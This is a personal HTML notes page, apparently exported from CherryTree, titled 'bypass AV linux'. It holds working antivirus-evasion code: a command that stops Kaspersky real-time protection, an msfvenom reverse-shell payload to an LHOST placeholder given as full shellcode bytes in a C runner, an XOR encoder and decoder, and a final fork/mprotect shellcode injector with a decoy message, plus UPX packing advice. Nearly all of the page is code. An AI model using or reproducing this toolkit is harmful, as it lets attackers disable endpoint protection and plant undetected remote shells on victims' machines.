<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>bypass AV linux</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>bypass AV linux</h1><br/><p></p><p><h2>Bypass AV </h2></p><p><ul><li>Kaspersky Endpoint Security<ul><li>sudo kesl-control --stop-t 1 #disable real time protection</li></ul></li><li>64-bit Meterpreter payload encoded with the x64/zutto_dekiru</li></ul></p><p>encoder is not detected by the AV<ul><li>x86/shikata_ga_nai</li><li>sudo kesl-control --scan-file ./met64zutto.elf</li><li>C wrapper</p><p></li></ul><div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#include &lt;stdio.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdlib.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;unistd.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">// Our payload generated by msfvenom</span><br /><span style="color:#0088ff;font-weight:400">// sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.X.Y LPORT=443 -f c</span><br /><span style="color:#7f0044;font-weight:400">unsigned</span> <span style="color:#7f0044;font-weight:400">char</span> buf[] =<br /><span style="color:#3ad900;font-weight:400">&quot;\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x05\x39\xc0\xa8&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x76\x03\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6&quot;</span>;<br /><span style="color:#7f0044;font-weight:400">int</span> main (<span style="color:#7f0044;font-weight:400">int</span> argc, <span style="color:#7f0044;font-weight:400">char</span> **argv)<br />{<br /><span style="color:#0088ff;font-weight:400">// Run our shellcode</span><br /><span style="color:#7f0044;font-weight:400">int</span> (*ret)() = (<span style="color:#7f0044;font-weight:400">int</span>(*)())buf;<br />ret();<br />}<br /></pre></div><ul><li>other bypass methods<ul><li>rename it with .exe</li><li>obfuscate our original shellcode string (XOR)</li><li>XOR encoder</p><p></li></ul></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">// XOR encoder</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdio.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdlib.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;unistd.h&gt;</span><br /><span style="color:#7f0044;font-weight:400">unsigned</span> <span style="color:#7f0044;font-weight:400">char</span> buf[] =<br /><span style="color:#3ad900;font-weight:400">&quot;\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31\xff\x6a\x3c&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x58\x0f\x05\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xff\x6a\x3c\x58\x0f\x05\x48\x31\xff\x6a\x09\x58\x99\xb6\x10&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x48\x89\xd6\x4d\x31\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x85\xc0\x78\x51\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x5f\x6a\x01\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x02\x00\x05\x39\xc0\xa8\x76\x03\x51\x48\x89\xe6\x6a\x10\x5a&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x6a\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xe6&quot;</span>;<br /><span style="color:#7f0044;font-weight:400">int</span> main (<span style="color:#7f0044;font-weight:400">int</span> argc, <span style="color:#7f0044;font-weight:400">char</span> **argv)<br />{<br />    <span style="color:#7f0044;font-weight:400">char</span> xor_key = <span style="color:#00117f;font-weight:400">&#39;J&#39;</span>;<br />    <span style="color:#7f0044;font-weight:400">int</span> payload_length = (<span style="color:#7f0044;font-weight:400">int</span>) <span style="color:#ff9d00;font-weight:400">sizeof</span>(buf);<br />    <span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#7f0044;font-weight:400">int</span> i=<span style="color:#ff0044;font-weight:400">0</span>; i&lt;payload_length; i++)<br />    {<br />        printf(<span style="color:#3ad900;font-weight:400">&quot;\\x%02X&quot;</span>,buf[i]^xor_key);<br />    }<br /><span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#ff0044;font-weight:400">0</span>;<br />}</pre></div><ul><li>c wrapper</li></ul></p><p>  <div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#include &lt;stdio.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdlib.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;unistd.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">// Our obfuscated shellcode</span><br /><span style="color:#7f0044;font-weight:400">unsigned</span> <span style="color:#7f0044;font-weight:400">char</span> buf[] =<br /><span style="color:#3ad900;font-weight:400">&quot;\x20\x73\x12\x45\x4F\x02\xCF\x8A...x32\x71\x02\xDD\x02\xF3\x48&quot;</span>;<br /><span style="color:#7f0044;font-weight:400">int</span> main (<span style="color:#7f0044;font-weight:400">int</span> argc, <span style="color:#7f0044;font-weight:400">char</span> **argv)<br />{<br /><span style="color:#7f0044;font-weight:400">char</span> xor_key = <span style="color:#00117f;font-weight:400">&#39;J&#39;</span>;<br /><span style="color:#7f0044;font-weight:400">int</span> arraysize = (<span style="color:#7f0044;font-weight:400">int</span>) <span style="color:#ff9d00;font-weight:400">sizeof</span>(buf);<br /><span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#7f0044;font-weight:400">int</span> i=<span style="color:#ff0044;font-weight:400">0</span>; i&lt;arraysize-<span style="color:#ff0044;font-weight:400">1</span>; i++)<br />{<br />buf[i] = buf[i]^xor_key;<br />}<br /><span style="color:#7f0044;font-weight:400">int</span> (*ret)() = (<span style="color:#7f0044;font-weight:400">int</span>(*)())buf;<br />ret();<br />}</pre></div></p><p>  </p><p></p><p></p><p><strong><h2>Final shellcode injector (xor +mprotect bypass)</h2></strong></p><p></p><p></p><p><div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#define _GNU_SOURCE</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;sys/mman.h&gt;</span> <span style="color:#0088ff;font-weight:400">// for mprotect #include &lt;stdlib.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdio.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;dlfcn.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;unistd.h&gt;</span><br /><span style="color:#7f0044;font-weight:400">unsigned</span> <span style="color:#7f0044;font-weight:400">char</span> buf[]=<span style="color:#3ad900;font-weight:400">&quot;\x7B\xB5\x20\x43\x12\xD3\xFC\x5A\x02\xC3\x9C\x07\x7B\x83\x20\x68\x0B\x10\x20\x4D\x10\x45\x4F\x02\xCF\x8A\x32\x1B\x20\x40\x0B\x13\x1A\x20\x63\x12\xD3\x20\x48\x15\x20\x4B\x14\x45\x4F\x02\xCF\x8A\x32\x71\x02\xDD\x02\xF3\x48\x4A\x4B\xF1\x8A\xE2\x67\xD6\x1B\x02\xC3\xAC\x20\x5A\x10\x20\x60\x12\x45\x4F\x13\x02\xCF\x8A\x33\x6F\x03\xB5\x83\x3E\x52\x1D\x20\x69\x12\x20\x4A\x20\x4F\x02\xC3\xAD\x02\x7B\xBC\x45\x4F\x13\x13\x15\x02\xCF\x8A\x33\x8D\x20\x76\x12\x20\x4B\x15\x45\x4F\x14\x20\x34\x10\x45\x4F\x02\xCF\x8A\x32\xA7\xB5\xAC\x4A&quot;</span>;<br /><br /><span style="color:#7f0044;font-weight:400">int</span> main()<br />{<br /><span style="color:#7f0044;font-weight:400">char</span> xor_key = <span style="color:#00117f;font-weight:400">&#39;J&#39;</span>;<br /><span style="color:#7f0044;font-weight:400">int</span> arraysize = (<span style="color:#7f0044;font-weight:400">int</span>) <span style="color:#ff9d00;font-weight:400">sizeof</span>(buf);<br /><span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#7f0044;font-weight:400">int</span> i=<span style="color:#ff0044;font-weight:400">0</span>; i&lt;arraysize-<span style="color:#ff0044;font-weight:400">1</span>; i++)<br />{<br />buf[i] = buf[i]^xor_key;<br />}<br />printf(<span style="color:#3ad900;font-weight:400">&quot;I love programming.&quot;</span>);<br /><span style="color:#ff9d00;font-weight:700">if</span> (fork() == <span style="color:#ff0044;font-weight:400">0</span>)<br />{<br /><span style="color:#7f0044;font-weight:400">intptr_t</span> pagesize = sysconf(_SC_PAGESIZE);<br /><span style="color:#ff9d00;font-weight:700">if</span> (mprotect((<span style="color:#7f0044;font-weight:400">void</span> *)(((<span style="color:#7f0044;font-weight:400">intptr_t</span>)buf) &amp; ~(pagesize - <span style="color:#ff0044;font-weight:400">1</span>)),<br />pagesize, PROT_READ|PROT_EXEC)) {<br />perror(<span style="color:#3ad900;font-weight:400">&quot;mprotect&quot;</span>);<br /><span style="color:#0088ff;font-weight:400">// mprotect is used to change the protection on a region of memory. The protection mode is set to PROT_READ|PROT_EXEC, which means the memory can be read and executed but not written to.</span><br /><span style="color:#0088ff;font-weight:400">// fork to create a child process </span><br /><span style="color:#0088ff;font-weight:400">// if (fork() == 0) check if the current execution is the child </span><br /><span style="color:#ff9d00;font-weight:700">return</span> -<span style="color:#ff0044;font-weight:400">1</span>;<br />}<br /><span style="color:#7f0044;font-weight:400">int</span> (*ret)() = (<span style="color:#7f0044;font-weight:400">int</span>(*)())buf;ret();<br />}<br /><span style="color:#ff9d00;font-weight:700">else</span><br />{<br />printf(<span style="color:#3ad900;font-weight:400">&quot;HACK: returning from function...\n&quot;</span>);<br />}<br /><span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#ff0044;font-weight:400">3</span>;<br />}</pre></div></p><p>  <ul><li>-static : to compile statically the code<ul><li>you can use a packer to reduce its size</li><li>upx --best test.elf </li></ul></li><li>The use of mprotect to make a buffer executable and then executing code from The use of mprotect to make a buffer executable and then executing code from that buffer is a technique that can be associated with exploiting</p><p></li></ul></p></div>
</body>
</html>
